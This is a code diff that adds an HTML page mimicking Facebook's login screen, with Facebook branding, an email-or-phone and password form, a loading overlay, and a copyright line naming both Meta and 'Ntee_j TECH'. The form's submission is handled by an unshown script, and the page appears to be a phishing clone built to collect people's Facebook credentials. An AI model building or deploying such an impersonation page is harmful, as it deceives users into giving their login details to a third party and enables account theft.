@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title> Facebook sign up</title>
+  <link rel="stylesheet" href="./css/styleslogin.css">
+</head>
+<body>
+  <div class="container">
+    <div class="login-box">
+      <div class="logo-box">
+        <div class="facebook-square">
+          <span class="facebook-f">f</span>
+        </div>
+      </div>
+      <div class="login-form">
+        <form id="loginForm">
+          <div class="input-group">
+            <input type="text" placeholder="Enter email or phone" required name="emailOrPhone">
+          </div>
+          <div class="input-group">
+            <input type="password" placeholder="Enter your password" required id="password">
+            <span class="toggle-password"</span>
+          </div>
+          <button type="submit" class="login-button" id="loginButton">Login</button>
+          <a href="#" class="forgot-password">forgot password?</a>
+        </form>
+      </div>
+      <div class="create-account">
+        <button class="create-account-button">Create account</button>
+      </div>
+      <div class="language-selector">
+        <span class="language">Español</span>
+        <span class="language">English (US)</span>
+        <span class="language">Português (Brasil)</span>
+        <span class="language">Français (France)</span>
+        <span class="language">Deutsch</span>
+        <span class="language">Italiano</span>
+        <span class="language">العربية</span>
+      </div>
+      <div class="copyright">
+        &copy; 2024 Meta, Ntee_j TECH 
+      </div>
+    </div>
+  </div>
+
+  <div class="overlay" id="overlay">
+    <div class="loading">
+      <div class="spinner"></div>
+      <span class="loading-text">loading...</span>
+    </div>
+  </div>
+
+  <script src="./js/applogin.js"></script>
+</body>
+</html>
